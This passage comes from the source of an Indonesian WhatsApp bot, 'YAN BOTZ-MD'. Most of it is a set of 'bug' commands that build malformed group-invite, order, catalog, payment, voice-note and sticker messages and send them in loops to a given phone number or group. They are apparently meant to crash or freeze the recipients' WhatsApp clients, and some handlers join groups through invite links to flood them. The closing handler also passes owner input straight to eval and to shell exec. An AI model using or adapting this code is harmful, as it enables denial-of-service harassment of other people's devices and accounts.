"inviteExpiration": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${philips}`,
"groupName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${philips}`,
"caption": `${philips}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(`${text}@s.whatsapp.net`, groupInvite.message, { messageId: groupInvite.key.id })
await repjo(`Berhasil Mengirim Buginvite Di Nomer ${text}`)
}
break
case 'jobuginvite': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/jo.jpg') }, { upload: jobotz.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${philips}`,
"groupName": `𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃${philips}`,
"caption": `${philips}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jobugpc':
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/virgam yg ganas.jpeg') }, { upload: jobotz.waUploadToServer })
pc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363047368062014@g.us", //Jan di ubh
"inviteCode": "CZ/GAeOhayYnqjcK", //Jan di ubh
"inviteExpiration": "99999999999",
"invitetime": "9999999999999999",
"groupName": `YAN BOTZ-MD 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${thejo} ️️${philips}`,
"jpegThumbnail": virgam,//FIXED THE JO BOT MD
"caption": `BUG INVITE YAN BOTZ-MD\n\n${philips}`,
"jpegThumbnail": messa.imageMessage,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(m.chat, pc.message, { messageId: pc.key.id,})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
	break

case 'unlipc': {
if (!isCreator && !isBan) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/gambar/virgam yg ganas.jpeg') }, { upload: jobotz.waUploadToServer })
pc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363047368062014@g.us", //Jan di ubh
"inviteCode": "CZ/GAeOhayYnqjcK", //Jan di ubh
"inviteExpiration": "99999999999",
"invitetime": "9999999999999999",
"groupName": `YAN BOTZ-MD 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥${thejo} ️️${philips}`,
"jpegThumbnail": virgam,//FIXED THE JO BOT MD
"caption": `BUG INVITE YAN BOTZ-MD\n\n${thejo}`,
"jpegThumbnail": messa.imageMessage,
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fdocjo })
jobotz.relayMessage(m.chat, pc.message, { messageId: pc.key.id,})
buttonjo(`Start`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 1000)
}
	break

case 'jaditroli':{
if (!isCreator && !isBan) return 
if (!text) throw `Teksnya Mana?`
let troli = generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY YAN BOTZ-MD CASE MD",
"message": `${text}`,
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: fkonjo, contextInfo:{}}) 
	jobotz.relayMessage(m.chat, troli.message, { messageId: troli.key.id, })
	buttonjo(`Sukses Convert Troli`)
	}
	break

	case 'jotrolito': {
	if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
f = fs.readFileSync('src/gambar/virgam yg ganas.jpeg')
let troli = generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY YAN BOTZ-MD CASE MD",
"message":"😈⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: fkonjo, contextInfo:{}}) 
jobotz.relayMessage(`${text}@s.whatsapp.net`, troli.message, { messageId: troli.key.id, })
	await repjo(`Berhasil Mengirim Troli Di Nomer ${text}`)
	}
	break
	case 'jogastroli': {
	if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
f = fs.readFileSync('src/gambar/virgam yg ganas.jpeg')
let troli = generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY YAN BOTZ-MD CASE MD",
"message":"😈⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: fkonjo, contextInfo:{}}) 
jobotz.relayMessage(m.chat, troli.message, { messageId: troli.key.id,})
jobotz.relayMessage(`${text}@s.whatsapp.net`, troli.message, { messageId: troli.key.id, })
	buttonjo(`Berhasil Mengirim Troli Di Nomer ${text}`)
	}
	break

case 'troligc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '5'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
let troli = generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY YAN BOTZ-MD CASE MD",
"message":"😈⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: fkonjo, contextInfo:{}}) 
jobotz.relayMessage(tosendgc, troli.message, { messageId: troli.key.id, })
}
await repjo(`Sukses`)
}
	break

case 'jotroli':
if (!isCreator && !isBan) return 
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
f = fs.readFileSync('src/gambar/virgam yg ganas.jpeg')
let troli = generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY YAN BOTZ-MD CASE MD",
"message":"😈⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: fkonjo, contextInfo:{}}) 
jobotz.relayMessage(m.chat, troli.message, { messageId: troli.key.id,})
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'unlitroli': {
if (!isCreator && !isBan) return 
f = fs.readFileSync('src/gambar/virgam yg ganas.jpeg')
let troli = generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY YAN BOTZ-MD CASE MD",
"message":"😈⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: fkonjo, contextInfo:{}}) 
jobotz.relayMessage(m.chat, troli.message, { messageId: troli.key.id,})
buttonjo(`Start`)
await setTimeout(() => {
jobotz.sendMessage(m.chat, {text: command},{ messageId: m.key.id,})
}, 2000)
}
break
case 'jopay':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
const memek = generateWAMessageFromContent(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `YAN BOTZ-MD`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
jobotz.relayMessage(m.chat, memek.message, { messageId: memek.key.id,})
}
}
break
case 'jopayto':{
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
const memex = generateWAMessageFromContent(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `YAN BOTZ-MD`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
jobotz.relayMessage(`${text}@s.whatsapp.net`, memex.message, { messageId: memex.key.id,})
}
break
case 'jogaspay':{
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
const memex = generateWAMessageFromContent(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `YAN BOTZ-MD`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
jobotz.relayMessage(`${text}@s.whatsapp.net`, memex.message, { messageId: memex.key.id,})
jobotz.relayMessage(m.chat, memex.message, { messageId: memex.key.id,})
}
break
case 'jocatalog': {
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: jobotz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "99999999999999",
"title": `YAN BOTZ-MD CATALOG  ${thejo}`,
"description": `© YAN BOTZ-MD CATALOG ${thejo}`,
"currencyCode": "IDR",
"footerText": `© YAN BOTZ-MD CATALOG`,
"productImageCount": 1,
"firstImageId": 1,
"priceAmount1000": `1000 ${thejo}`,
"salePriceAmount1000": "IDR 9.000000",
"retailerId": `YAN BOTZ-MD`,
"url": "wa.me/6288286858385"
},
"businessOwnerJid": "6288286858385@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkonjo })
jobotz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
buttonjo(`Sukses Send Catalog Sebanyak ${jumlah}`)
}
break
case 'jocatalogv2': {
if (!isCreator && !isBan) return 
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia(
{ image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'} }, 
{ upload: jobotz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "JEMBOD",
"fileLength": "99999999999",
"jpegThumbnail": virgam,
"title": `YAN BOTZ-MD`,
"description": `💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤${virtex2}`,
"currencyCode": "IDR",
"productImageCount": 923456789,
"firstImageId": 1,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",  
"bodyText": `Gk guna😏`,
"footerText": `Sama gk guna😏`,
"retailerId": `CATALOG NEW ERA`,
"url": "https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw"
},
"businessOwnerJid": "6285706035039@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: shield2 })
jobotz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
buttonjo(`Sukses Send Catalogv2 Sebanyak ${jumlah}`)
}
break
case 'jadislayer':{
if (!isCreator && !isBan) return 
if (!m.quoted) throw `*Send/Reply Image`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ image: media }, 
{ upload: jobotz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "JEMBOD",
"fileLength": "99999999999",
"jpegThumbnail": virgam,
"title": `SLAYER BY:${text} ${virusv1}`,
"description": `${virusv1} ${thejo}`,
"currencyCode": "IDR",
"productImageCount": 923456789,
"firstImageId": 1,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",  
"bodyText": `Gk guna😏`,
"footerText": `Sama gk guna😏`,
"retailerId": `SLAYER 07`,
"url": "https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw"
},
"businessOwnerJid": "6285706035039@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: shield2 })
jobotz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
buttonjo(`Sukses Convert Catalog`)
}
break
case 'jadicatalog':{
if (!isCreator && !isBan) return 
if (!m.quoted) throw `*Send/Reply Image`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ image: media }, 
{ upload: jobotz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "JEMBOD",
"fileLength": "99999999999",
"jpegThumbnail": virgam,
"title": ` CATALOG BY: ${text} `,
"description": `💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤${philips}`,
"currencyCode": "IDR",
"productImageCount": 923456789,
"firstImageId": 1,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",  
"bodyText": `Gk guna😏`,
"footerText": `Sama gk guna😏`,
"retailerId": `CATALOG NEW ERA`,
"url": "https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw"
},
"businessOwnerJid": "6285706035039@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: shield2 })
jobotz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
buttonjo(`Sukses Convert Catalog`)
}
break
case 'jadimentahkat':{
if(!isCreator) return 
if (!m.quoted) throw `*Send/Reply Image`
if (!text) throw `Teksnya Mana?`
let media = await quoted.download()
var messa = await prepareWAMessageMedia(
{ image: media }, 
{ upload: jobotz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "THE JO BOT",
"fileLength": "99999999999",
"jpegThumbnail": virgam,
"title": "isi virus",
"description": "isi virus",
"currencyCode": "IDR",
"productImageCount": 923456789,
"firstImageId": 1,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",  
"bodyText": "isi virus",
"footerText": "isi virus",
"retailerId": `CATALOG NEW ERA`,
"url": "https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw"
},
"businessOwnerJid": "6285706035039@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: shield2 })
jobotz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break

case 'bugvngc': {
if (!isCreator && !isBan) return
if (!q) return repjo(`Linkgc mana?\nContoh: ${prefix+command} (linkgroup)`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) repjo(`Masukkan linkgc yg valid`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '2'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await jobotz.groupAcceptInvite(result)
 hey = fs.readFileSync('./src/vn/dosa pantek.mp3')
 jobotz.sendMessage(tosendgc, {audio: hey, mimetype: 'audio/mpeg', ptt:true , 
"contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}}}, {quoted: fdocjo, contextInfo:{}}) 
 jobotz.sendMessage(tosendgc, {audio: hey, mimetype: 'audio/mpeg', ptt:true , 
"contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}}}, {quoted: fkonjo, contextInfo:{}})
}
repjo(`Sukses`)
 }
break


case 'jobugvn':{
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
for (let i = 0; i < jumlah; i++) {
 hey = fs.readFileSync('./src/vn/dosa pantek.mp3')
 jobotz.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true , 
"contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}},caption: captijo}, {quoted: fgamjo, contextInfo:{}}) 
 jobotz.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true , 
"contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}}, caption: captijo}, {quoted: fdocjo, contextInfo:{}}) 
 jobotz.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true , 
"contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}}, caption: captijo}, {quoted: fkonjo, contextInfo:{}})
}
 buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
break

case 'jadibugvn':{
if (!isCreator && !isBan) return
if (!m.quoted) throw `Reply Audio`
let media = await quoted.download()
 hey = media,
 jobotz.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true , "contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}}},{quoted: fkonjo, contextInfo:{}})
 jobotz.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true , "contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}}},{quoted: fdocjo, contextInfo:{}})
 buttonjo(`Sukses Convert Bugvn`)
 }
break
case 'tobugstik': {
  if (!isCreator && !isBan) return
  if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
  if (/image/.test(mime)) {
 let media = await quoted.download()
 hey = media,
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fgamjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fdocjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fkonjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fsticjo}) 
}
buttonjo(`Sukses Convert To Bugstik`)
}
break
   case 'jadibugstik': {
 if (!isCreator && !isBan) return
 if (!quoted) throw `Sticker Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) {
let media = await quoted.download()
 hey = media,
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fgamjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fdocjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fkonjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fsticjo}) 
}
buttonjo(`Sukses Convert Bugstik`)
}
break
case 'jobugstik':{
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
for (let i = 0; i < jumlah; i++) {
hey = fs.readFileSync('./src/gambar/anjas.webp')
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fgamjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fdocjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fkonjo}) 
jobotz.sendMessage(m.chat, {sticker: hey}, {quoted: fsticjo}) 
}
buttonjo(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jovnto':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
 hey = fs.readFileSync('./src/vn/dosa pantek.mp3')
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: fkonjo})
await repjo(`Berhasil Mengirim Bugvn Di Nomer ${text}@s.whatsapp.net`)
break
case 'jogasvn':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
 hey = fs.readFileSync('./src/vn/dosa pantek.mp3')
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: fkonjo})
  jobotz.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: fkonjo})
buttonjo(`Berhasil Mengirim Bugvn Di Nomer ${text}@s.whatsapp.net`)
break

case 'jostikto':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fkonjo}) 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fdocjo}) 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fsticjo}) 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fgamjo}) 
await m.reply(`Berhasil Mengirim Bugstik Di Nomer ${text}@s.whatsapp.net`)
break
case 'jogasstik':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fkonjo}) 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fdocjo}) 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fsticjo}) 
jobotz.sendMessage(`${text}@s.whatsapp.net`, {sticker: thumb}, {quoted: fgamjo}) 
jobotz.sendMessage(m.chat, {sticker: thumb}, {quoted: fkonjo}) 
jobotz.sendMessage(m.chat, {sticker: thumb}, {quoted: fdocjo}) 
jobotz.sendMessage(m.chat, {sticker: thumb}, {quoted: fsticjo}) 
jobotz.sendMessage(m.chat, {sticker: thumb}, {quoted: fgamjo}) 
buttonjo(`Berhasil Mengirim Bugstik Di Nomer ${text}@s.whatsapp.net`)
break
case 'jobugstikv3':{
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {sticker: thumb,
"contextInfo": {
"externalAdReply": {
"title": `${wm} ${thejo}`,
"body":`${wm} ${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam
}}}, {quoted: fsticjo, contextInfo:{}})
}
buttonjo(`Sukses Send Bugstik Sebanyak ${jumlah}`)
}
break

case 'jobugstikv2':{
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
jobotz.sendMessage(m.chat, {sticker: thumb},{quoted: fsticjo})
jobotz.sendMessage(m.chat, {sticker: thumb},{quoted: fdocjo})
jobotz.sendMessage(m.chat, {sticker: thumb},{quoted: fgamjo})
jobotz.sendMessage(m.chat, {sticker: thumb},{quoted: fkonjo})
}
buttonjo(`Sukses Send Bugstik Sebanyak ${jumlah}`)
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    jobotz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
